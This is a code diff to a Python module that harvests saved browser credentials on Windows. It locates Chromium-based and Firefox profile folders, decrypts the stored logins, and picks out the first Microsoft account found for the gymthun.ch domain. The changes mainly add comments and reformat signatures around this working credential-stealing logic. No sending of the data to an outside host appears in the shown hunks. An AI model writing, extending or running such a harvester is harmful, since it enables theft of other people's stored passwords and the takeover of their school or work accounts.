@@ -27,6 +27,7 @@ from .firefox_harvester import get_all_firefox_creds
 APPDATA = environ['USERPROFILE'] + r"\AppData"
 
 DATA_DIRS = {
+    # possible data directories used for various chromium-based browsers
     "Opera": norm(APPDATA + r"\Roaming\Opera Software\Opera Stable"),
     "Brave": norm(APPDATA + r"\Local\BraveSoftware\Brave-Browser\User Data"),
     "Chrome": norm(APPDATA + r"\Local\Google\Chrome\User Data"),
@@ -59,6 +60,8 @@ def decrypt_data(ciphertext: bytes, encrypted_key: str) -> str:
 
 async def get_chromium_creds(user_data: str, use_b64: bool = False) -> (
         typing.List)[typing.Dict[str, typing.Union[str, int]]]:
+    # gets all credentials based on user-data-dir
+    # binary data gets encoded with base64 if use_b64 is set to true
     loop = asyncio.get_event_loop()
     creds = []
     if path_exists(user_data) and path_exists(user_data + r"\Local State"):
@@ -95,13 +98,16 @@ async def get_chromium_creds(user_data: str, use_b64: bool = False) -> (
                                               "display_name": display_name,
                                               "possible_username_pairs": possible_username_pairs
                                               })
+                # cleanup temporary directory
                 await loop.run_in_executor(None, lambda: shutil.rmtree(_dir))
     else:
         raise ValueError(f"Local State not found in {user_data}")
     return creds
 
 
-async def get_all_chromium_creds(use_b64: bool = False) -> typing.Dict[str, typing.List[typing.Dict[str, typing.Union[str, int]]]]:
+async def get_all_chromium_creds(use_b64: bool = False) -> typing.Dict[
+    str, typing.List[typing.Dict[str, typing.Union[str, int]]]]:
+    # attempts to get all credentials for all DATA_DIRS
     all_credentials = {}
 
     coro_s = []
@@ -123,6 +129,7 @@ async def get_all_chromium_creds(use_b64: bool = False) -> typing.Dict[str, typi
 def get_all_firefox_creds_wrapper():
     # noinspection PyBroadException
     try:
+        # converts Generator[any] to list (executes all)
         return list(get_all_firefox_creds(sub_stream=False))
     except Exception:
         traceback.print_exc()
@@ -140,8 +147,9 @@ async def get_all_creds(use_b64: bool = False):
     return all_creds
 
 
-async def harvest_creds(use_b64: bool = False) -> typing.Tuple[str, str, str]:
-    _credentials = await get_all_creds(use_b64=use_b64)
+async def harvest_creds() -> typing.Tuple[str, str, str]:
+    # attempts to get the creds for the first gymthun.ch microsoft account found
+    _credentials = await get_all_creds(use_b64=False)
     for browser, all_creds in _credentials.items():
         for creds in all_creds:
             if "login.microsoftonline.com" in creds.get("action_url",
@@ -150,8 +158,10 @@ async def harvest_creds(use_b64: bool = False) -> typing.Tuple[str, str, str]:
 
 
 # noinspection PyTypeChecker
-def bin_to_str(obj):
-    stack = deque([(obj, None, None)])  # (current object, parent, key/index in parent)
+def bin_to_str(obj: dict):
+    # converts any byte object nested into object to a string
+    # note: this replaces errors and removes \u0000 characters for readability
+    stack = deque([(obj, None, None)])
 
     while stack:
         current, parent, key = stack.pop()
